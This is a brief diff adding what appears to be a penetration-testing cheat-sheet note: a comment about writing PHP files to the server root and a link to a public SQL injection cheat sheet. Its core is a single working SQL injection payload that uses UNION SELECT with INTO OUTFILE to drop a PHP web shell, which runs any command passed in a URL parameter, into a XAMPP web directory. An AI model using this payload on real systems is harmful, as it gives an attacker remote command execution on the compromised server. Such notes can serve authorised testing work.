@@ -1,0 +1,7 @@
+#Write PHP files to a specific dir
+#usually the Server ROOT on phpinfo.php info page
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -' 
+
+https://pentestmonkey.net/category/cheat-sheet/sql-injection
+
+
